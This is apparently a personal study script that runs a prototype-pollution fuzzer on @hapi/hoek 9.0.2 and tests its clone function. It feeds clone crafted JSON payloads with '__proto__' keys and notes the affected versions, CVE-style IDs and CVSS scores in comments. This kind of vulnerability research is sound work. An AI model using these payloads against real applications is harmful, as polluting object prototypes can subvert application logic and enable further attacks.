let rootFolder =
  "/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/exploit";

var fuzzer = require(`${rootFolder}/prototype-pollution-nsec18/find-vuln/find-vuln.js`);
let libPath =
  "/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/npm_libraries/@hapi_hoek/v9.0.2/node_modules/@hapi/hoek/";
(async function () {
  var fuzzerResults = await fuzzer(libPath);
  console.log(fuzzerResults);

  //test clone()
  //hoek test
  const Hoek = require("@hapi/hoek");
  const nestedObj = {
    w: /^something$/gi,
    x: {
      a: [1, 2, 3],
      b: 123456,
      c: new Date(),
    },
    y: "y",
    z: new Date(),
  };

  const copy = Hoek.clone(nestedObj);

  copy.x.b = 100;

  console.log(copy.y); // results in 'y'
  console.log(nestedObj.x.b); // results in 123456
  console.log(copy.x.b); // results in 100

  //9.0.1 is vuln
  //9.0.2 is vuln
  //exploit 9.0.3 is fixed for this one
  //SONATYPE-2020-0032 CVSS:9.8 ->fast track 1468 - no details
  //CWE-471: Modification of Assumed-Immutable Data (MAID)
  //clone function
  //CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  //sonatype-2020-0074
  //CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
  const a = JSON.parse('{ "__proto__": { "x": 1 } }');
  const b = Hoek.clone(a);
  console.log(b.x);

  console.log(a.x);
  console.log(a.x);
  // console.log(a);
  // console.log(x);
  BAD_JSON = JSON.parse('{"__proto__":{"test":123}}');
  let res = Hoek.clone(BAD_JSON);
  console.log({})
  console.log(res.test);
})();
